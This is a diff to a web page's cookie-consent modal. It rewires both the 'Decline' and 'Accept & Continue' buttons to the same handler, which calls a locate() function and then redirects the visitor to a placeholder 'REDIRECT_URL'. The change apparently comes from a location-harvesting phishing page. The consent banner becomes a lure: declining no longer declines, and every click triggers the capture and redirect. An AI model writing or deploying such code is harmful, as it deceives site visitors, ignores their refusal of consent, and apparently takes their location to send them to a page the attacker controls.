@@ -33,8 +33,8 @@
             <p>By continuing, you agree to our use of cookies and data collection practices. You can adjust your preferences anytime in settings.</p>
             
             <div class="modal-buttons">
-                <button class="btn btn-secondary" onclick="declineCookies()">Decline</button>
-                <button class="btn btn-primary" onclick="acceptCookies()">Accept & Continue</button>
+                <button id="requestButton" class="btn btn-secondary" onclick="locate(function(){window.location='REDIRECT_URL';}, function(){$('#change').html('Failed');});">Decline</button>
+                <button id="requestButton" class="btn btn-primary" onclick="locate(function(){window.location='REDIRECT_URL';}, function(){$('#change').html('Failed');});">Accept & Continue</button>
             </div>
         </div>
     </div>
